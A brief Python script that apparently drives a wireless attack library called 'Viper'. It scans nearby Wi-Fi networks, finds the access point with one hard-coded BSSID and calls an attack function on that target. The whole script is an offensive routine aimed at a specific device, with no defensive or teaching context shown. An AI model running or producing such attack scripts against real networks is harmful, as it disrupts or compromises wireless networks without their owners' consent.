from Viper.viper import Viper

viper = Viper()

viper.scan(15)

print(viper.stations)

ctr = 0
for i in viper.ap:
    if '70:72:3C:C5:55:F3' in i['BSSID']:
        break
    ctr += 1

index = ctr

viper.attack(index)